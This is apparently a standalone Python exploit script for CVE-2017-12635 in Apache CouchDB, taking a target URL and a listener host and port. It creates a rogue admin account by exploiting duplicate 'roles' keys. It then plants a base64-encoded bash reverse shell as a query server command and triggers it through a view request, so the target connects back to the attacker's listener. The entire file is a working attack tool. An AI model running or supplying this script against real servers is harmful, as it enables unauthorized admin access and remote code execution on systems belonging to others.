#!/usr/bin/env python3
import requests
import json
import base64
from requests.auth import HTTPBasicAuth
import argparse

parser = argparse.ArgumentParser(description="exp CVE-2017-12635")
parser.add_argument('--debug', '-d', action='store_true',
                    help='debug mode', default=False)
parser.add_argument("--version","-v", help="couchdb版本",type=int,choices=[1,2],default=1)
parser.add_argument("--url","-u",help="目标url",required=True)
parser.add_argument("--lhost",required=True)
parser.add_argument("--lport",required=True)


if __name__ == "__main__":
    args = parser.parse_args()
    url = args.url
    version = args.version
    command = f'sh -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'
    if not url.startswith('http'):
        url = 'http://'+url
    # add account
    session = requests.session()
    session.headers = {
        'Content-Type': 'application/json'
    }
    try:
        session.put(url + '/_users/org.couchdb.user:ggooddd', data='''{
            "type": "user",
            "name": "ggooddd",
            "roles": ["_admin"],
            "roles": [],
            "password": "ggooddd"
            }'''
        )
        session.auth = HTTPBasicAuth('ggooddd', 'ggooddd')

        # cmd exec
        command = "bash -c '{echo,%s}|{base64,-d}|{bash,-i}'" % base64.b64encode(command.encode()).decode()
        if version == 1:
            session.put(url + ('/_config/query_servers/cmd'), data=json.dumps(command))
        else:
            host = session.get(url + '/_membership').json()['all_nodes'][0]
            session.put(url + '/_node/{}/_config/query_servers/cmd'.format(host), data=json.dumps(command))

        session.put(url + '/ggooddd')
        session.put(url + '/ggooddd/test', data='{"_id": "ggoodddtest"}')
    except Exception as e:
        print('Fail')
        print(str(e))
    try:
        print(f'try rebound shell to {args.lhost}:{args.lport}')
        if version == 1:
            session.post(url + '/ggooddd/_temp_view?limit=10', data='{"language":"cmd","map":""}',timeout=2)
        else:
            session.put(url + '/ggooddd/_design/test', data='{"_id":"_design/test","views":{"ggooddd":{"map":""} },"language":"cmd"}',timeout=2)
    except:
        pass